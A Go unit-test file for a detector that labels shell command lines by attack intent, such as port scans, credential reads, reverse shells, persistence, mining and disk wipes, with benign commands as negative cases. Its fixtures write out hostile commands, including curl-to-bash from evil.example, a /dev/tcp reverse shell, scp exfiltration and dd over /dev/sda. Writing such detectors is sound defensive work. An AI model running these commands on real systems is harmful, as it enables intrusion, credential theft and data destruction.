// SPDX-License-Identifier: Apache-2.0

package intent

import (
	"context"
	"reflect"
	"strings"
	"testing"
)

// TestBuiltinTable 战役行为样例（M3 seed 规则集语义的标签化外推）：每标签
// 至少一个正例，全部走真实 argv 拼接形态。
func TestBuiltinTable(t *testing.T) {
	b := NewBuiltin()
	cases := []struct {
		argv []string
		want []string
	}{
		{argv: []string{"nmap", "-sS", "10.0.0.0/8"}, want: []string{"recon_port_scan"}},
		{argv: []string{"masscan", "10.0.0.0/8", "-p", "1-65535"}, want: []string{"recon_port_scan"}},
		{argv: []string{"curl", "-s", "http://evil.example/x.sh", "|", "bash"}, want: []string{"download_and_execute"}},
		{argv: []string{"wget", "http://evil.example/x", "-O", "/dev/shm/x"}, want: []string{"remote_download"}},
		{argv: []string{"cat", "/root/.ssh/id_rsa"}, want: []string{"cred_material_read"}},
		{argv: []string{"grep", "-r", "AWS_SECRET", "/home/u/.env"}, want: []string{"cred_material_read"}},
		{argv: []string{"crontab", "-e"}, want: []string{"persistence_cron"}},
		{argv: []string{"./xmrig", "--donate-level", "1", "--url=stratum+tcp://pool.minexmr.com:3333"}, want: []string{"mining_indicator"}},
		{argv: []string{"cloudflared", "tunnel", "--url", "http://localhost:8080"}, want: []string{"tunnel_setup"}},
		{argv: []string{"ssh", "-R", "8080:127.0.0.1:80", "user@gateway"}, want: []string{"tunnel_setup"}},
		{argv: []string{"sudo", "cat", "/etc/shadow"}, want: []string{"privesc_sudo"}},
		{argv: []string{"su", "-", "root"}, want: []string{"privesc_sudo"}},
		{argv: []string{"useradd", "-m", "backdoor"}, want: []string{"user_creation"}},
		{argv: []string{"usermod", "-aG", "root", "svc"}, want: []string{"user_mod_root"}},
		{argv: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}, want: []string{"reverse_shell"}},
		{argv: []string{"nc", "-l", "-p", "4444", "-e", "/bin/sh"}, want: []string{"reverse_shell", "bind_shell"}},
		{argv: []string{"sh", "-c", "history -c; unset HISTFILE"}, want: []string{"shell_history_clear"}},
		{argv: []string{"systemctl", "stop", "auditd"}, want: []string{"audit_log_tamper", "service_restart"}},
		{argv: []string{"echo", "ssh-ed25519 AAAA", ">>", "/root/.ssh/authorized_keys"}, want: []string{"ssh_authorized_key_write"}}, // 写公钥不算读取凭证（cred 动词约束修正）
		{argv: []string{"chmod", "4755", "/tmp/rootkit"}, want: []string{"setuid_change", "staging_exec"}},
		{argv: []string{"chmod", "u+s", "/usr/bin/find"}, want: []string{"setuid_change"}},
		{argv: []string{"insmod", "/lib/modules/rk.ko"}, want: []string{"lkm_load"}},
		{argv: []string{"bpftool", "prog", "load", "x.o", "/sys/fs/bpf/x"}, want: []string{"bpf_load"}},
		{argv: []string{"docker", "run", "--privileged", "-v", "/:/host", "alpine", "sh"}, want: []string{"docker_abuse"}},
		{argv: []string{"cat", "/root/.kube/config"}, want: []string{"cred_material_read", "kube_credential_read"}},
		{argv: []string{"curl", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"}, want: []string{"cloud_credential_read"}},
		{argv: []string{"cat", "/proc/1/environ"}, want: []string{"proc_environ_dump"}},
		{argv: []string{"tar", "czf", "/tmp/out.tgz", "/var/www"}, want: []string{"data_archive"}},
		{argv: []string{"scp", "/tmp/data.tgz", "user@evil.example:/tmp/"}, want: []string{"data_upload"}},
		{argv: []string{"sh", "-c", "echo aGVsbG8= | base64 -d | sh"}, want: []string{"obfuscated_payload"}},
		{argv: []string{"sh", "-c", "chmod +x /tmp/.x && /tmp/.x"}, want: []string{"staging_exec"}},
		{argv: []string{"proxychains4", "nmap", "10.0.0.0/8"}, want: []string{"recon_port_scan", "proxy_anonymizer"}},
		{argv: []string{"torsocks", "ssh", "user@host"}, want: []string{"proxy_anonymizer"}},
		{argv: []string{"dd", "if=/dev/zero", "of=/dev/sda", "bs=1M"}, want: []string{"disk_wipe"}},
		{argv: []string{"python3", "-c", "import os"}, want: []string{"interpreter_one_liner"}},
		{argv: []string{"apt-get", "install", "-y", "htop"}, want: []string{"package_install"}},
		{argv: []string{"systemctl", "restart", "nginx"}, want: []string{"service_restart"}},
		{argv: []string{"sed", "-i", "s/80/8080/", "/etc/nginx/nginx.conf"}, want: []string{"config_edit"}},

		{argv: []string{"ls", "-la"}, want: nil},
		{argv: []string{"git", "status"}, want: nil},
		{argv: []string{"cat", "/etc/hosts"}, want: nil},
		{argv: []string{"systemctl", "status", "nginx"}, want: nil},
		{argv: []string{"docker", "ps"}, want: nil},
		{argv: []string{"journalctl", "-u", "sshd"}, want: nil},
		{argv: []string{"cat", "/var/log/monitor.log"}, want: nil}, // tor 子串不得命中
		{argv: []string{"grep", "-c", "error", "app.log"}, want: nil},
	}
	ctx := context.Background()
	for _, tc := range cases {
		got := b.Label(ctx, joinArgv(tc.argv))
		var tags []string
		for _, l := range got {
			tags = append(tags, l.Tag)
			if l.Score != 1.0 {
				t.Fatalf("%v: builtin 命中分应为 1.0，得到 %v", tc.argv, l.Score)
			}
		}
		if tc.want == nil && len(tags) != 0 {
			t.Fatalf("%v: 期望无标签，得到 %v", tc.argv, tags)
		}
		if tc.want != nil && !reflect.DeepEqual(tags, tc.want) {
			t.Fatalf("%v: 期望标签 %v，得到 %v", tc.argv, tc.want, tags)
		}
	}
}

func TestBuiltinDeterministicAndCaseInsensitive(t *testing.T) {
	b := NewBuiltin()
	cmd := joinArgv([]string{"NMAP", "-sS", "10.0.0.0/8"})
	a := b.Label(context.Background(), cmd)
	c := b.Label(context.Background(), cmd)
	if !reflect.DeepEqual(a, c) {
		t.Fatalf("纯函数应确定性: %v vs %v", a, c)
	}
	if len(a) != 1 || a[0].Tag != "recon_port_scan" {
		t.Fatalf("大小写不敏感应命中: %v", a)
	}
}

func TestJoinArgvTruncation(t *testing.T) {
	pad := make([]byte, 300)
	for i := range pad {
		pad[i] = 'A'
	}
	got := joinArgv([]string{string(pad), string(pad), string(pad), string(pad), "xmrig"})
	if len(got) != 1024 {
		t.Fatalf("应截到 1024 字节，得到 %d", len(got))
	}
	if want := joinArgv([]string{"xmrig"}); got == want {
		t.Fatal("不应保留被截掉的尾部")
	}
	if joinArgv([]string{"xmrig"}) != "xmrig" {
		t.Fatal("短命令行不应被改动")
	}
	// 多字节 rune 边界：截断点落在中文三字节 rune 内时退到边界，不产生半个 rune。
	cjk := joinArgv([]string{repeatStr("检测", 600)})
	for _, r := range cjk {
		if r == 0xFFFD {
			t.Fatal("截断产生了非法 rune")
		}
	}
}

func repeatStr(s string, n int) string {
	out := make([]byte, 0, len(s)*n)
	for i := 0; i < n; i++ {
		out = append(out, s...)
	}
	return string(out)
}

// cred 路径引用 vs 读取的区分（五轮 FP01/02 根因：runner 的
// ssh -i /root/.ssh/id_bench 两次引用凑满 8.0 阈值，benign 运维 ssh 全中）。
func TestCredMaterialReadRequiresReadVerb(t *testing.T) {
	b := NewBuiltin()
	cases := []struct {
		argv []string
		want bool
	}{
		{argv: []string{"ssh", "-n", "-i", "/root/.ssh/id_bench", "root@127.0.0.1", "true"}, want: false},
		{argv: []string{"ssh", "-i", "/home/u/.ssh/id_rsa", "host"}, want: false},
		{argv: []string{"cat", "/root/.ssh/id_rsa"}, want: true},
		{argv: []string{"scp", "/home/u/.ssh/id_rsa", "x@1.2.3.4:/tmp/"}, want: true},
		{argv: []string{"base64", "-w0", "/root/.ssh/id_rsa"}, want: true},
		{argv: []string{"bash", "-c", "cat /root/.ssh/id_rsa > /dev/null; setpriv --reuid=1800 scp /etc/hosts w@127.0.0.1:/tmp/"}, want: true},
	}
	for _, c := range cases {
		got := false
		for _, l := range b.Label(context.Background(), strings.Join(c.argv, " ")) {
			if l.Tag == "cred_material_read" {
				got = true
			}
		}
		if got != c.want {
			t.Errorf("argv=%v cred_material_read=%v want %v", c.argv, got, c.want)
		}
	}
}

// 丢弃型下载（-O /dev/null 健康检查）不打 remote_download（产线容器服务
// 每分钟误分实证）；落地下载仍打。
func TestRemoteDownloadExcludesDiscard(t *testing.T) {
	b := NewBuiltin()
	cases := []struct {
		argv []string
		want bool
	}{
		{argv: []string{"wget", "-q", "-O", "/dev/null", "http://127.0.0.1:10440/healthz"}, want: false},
		{argv: []string{"curl", "-s", "-o", "/dev/null", "http://localhost/h"}, want: false},
		{argv: []string{"wget", "http://evil/x", "-O", "/tmp/payload"}, want: true},
		{argv: []string{"curl", "http://evil/x.sh", "-o", "/dev/shm/x"}, want: true},
	}
	for _, c := range cases {
		got := false
		for _, l := range b.Label(context.Background(), strings.Join(c.argv, " ")) {
			if l.Tag == "remote_download" {
				got = true
			}
		}
		if got != c.want {
			t.Errorf("argv=%v remote_download=%v want %v", c.argv, got, c.want)
		}
	}
}
